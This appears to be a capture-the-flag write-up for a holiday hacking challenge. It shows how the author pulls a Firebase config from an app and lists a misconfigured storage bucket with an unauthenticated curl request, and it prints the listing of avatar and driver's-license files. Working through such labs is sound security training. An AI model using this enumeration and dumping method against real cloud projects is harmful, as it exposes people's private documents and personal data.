# TASK 18 - Gnome Tea
Difficulty: ❄️❄️❄️

[Direct Link](https://gnometea.web.app/)

## OBJECTIVE : ##
>Enter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.



## HINTS: ##
<details>
  <summary>Hints provided for Task 13</summary>
  
>-	**GnomeTea:** I heard rumors that the new GnomeTea app is where all the Gnomes spill the tea on each other. It uses Firebase which means there is a client side config the app uses to connect to all the firebase services.
>-  **Statically Coded:** Hopefully they did not rely on hard-coded client-side controls to validate admin access once a user validly logs in. If so, it might be pretty easy to change some variable in the developer console to bypass these controls.
>-  **License:** Exif jpeg image data can often contain data like the latitude and longitude of where the picture was taken.
>-  **Rules:** Hopefully they setup their firestore and bucket security rules properly to prevent anyone from reading them easily with curl. There might be sensitive details leaked in messages.

</details>

#

## PROCEDURE : ##

We are presented with a login screen and not much more information.  After hours and hours of looking through the code, GToogling and chatting with ChatGPT, I was able to find the following:

```
const OP = {
    apiKey: "AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",
    authDomain: "holidayhack2025.firebaseapp.com",
    projectId: "holidayhack2025",
    storageBucket: "holidayhack2025.firebasestorage.app",
    messagingSenderId: "341227752777",
    appId: "1:341227752777:web:7b9017d3d2d83ccf481e98"
}
```

This part of the code tells us that the Firebase storage bucket used by the app is called `holidayhack2025.firebasestorage.app` and we can use this simple bit of information to check whether their database is exposed to the internet and dump its contents if it is.  We do this by calling `curl "https://firebasestorage.googleapis.com/v0/b/<BUCKET NAME>/o/`.  note that the `/o` at the enmd of the URI is included to list the objects within the bucket.

This gives us a nice list of image files contained under two directories; `gnome-avatars` and `gnome-documents`.  I used a [simple bash script](Code/firebasedownloader.sh) to download all of these files.

```
└─$ curl "https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/"

{
  "prefixes": [],
  "items": [
    {
      "name": "gnome-avatars/6J2bowmKiNVbITWmR4XsxjH7i492_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/6nBUHcdxo2fLKSYqYyipr9iCOey2_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/7sQlw9l4xUOWSjDTphvLgKVEm0j1_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/G5c0vX06WOaEf1YKutqkur4HEU63_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/IvLFBZQgo3R6iteLHmShbWmctqo2_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/LA5w0EskgSbQyFnlp9OrX8Zovu43_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/LOPFa6rXj6eB7uMVHu6IbKARYbe2_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/PyxedrsAN2bewsg4Rno9SsCqZHg2_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/RQw0hYxlKIhsTUVPyR8ivrM3ls02_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/VgJCVlELJ6VfQTxeIt1dR5PWyiX2_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/golJeh7xg9YUvcj5nDugTssQPy62_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/jlm1nPFV5xWM4jQaokLHDb6K8kj1_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/kmoZyOIt7sWgehQC8ovcsxXPWUS2_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/l7VS01K9GKV5ir5S8suDcwOFEpp2_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/prxA2hBSkhg3dkhkfzvnlGxCCfP2_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/pwbhMFuRbkesddTrtT3gVRzv8Ux1_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/q6GasKLVBYSo3g4c1mI6qXDpRmv2_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-avatars/xK25sJX7usSwAJwAjpN8DMfzS872_profile.png",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/6J2bowmKiNVbITWmR4XsxjH7i492_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/6nBUHcdxo2fLKSYqYyipr9iCOey2_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/7sQlw9l4xUOWSjDTphvLgKVEm0j1_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/G5c0vX06WOaEf1YKutqkur4HEU63_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/IvLFBZQgo3R6iteLHmShbWmctqo2_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/LA5w0EskgSbQyFnlp9OrX8Zovu43_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/LOPFa6rXj6eB7uMVHu6IbKARYbe2_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/PyxedrsAN2bewsg4Rno9SsCqZHg2_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/RQw0hYxlKIhsTUVPyR8ivrM3ls02_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/VgJCVlELJ6VfQTxeIt1dR5PWyiX2_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/golJeh7xg9YUvcj5nDugTssQPy62_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/jlm1nPFV5xWM4jQaokLHDb6K8kj1_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/kmoZyOIt7sWgehQC8ovcsxXPWUS2_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/prxA2hBSkhg3dkhkfzvnlGxCCfP2_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/pwbhMFuRbkesddTrtT3gVRzv8Ux1_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/q6GasKLVBYSo3g4c1mI6qXDpRmv2_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    },
    {
      "name": "gnome-documents/xK25sJX7usSwAJwAjpN8DMfzS872_drivers_license.jpeg",
      "bucket": "holidayhack2025.firebasestorage.app"
    }
  ]
```


useful  [https://isc.sans.edu/diary/32158](https://isc.sans.edu/diary/32158)
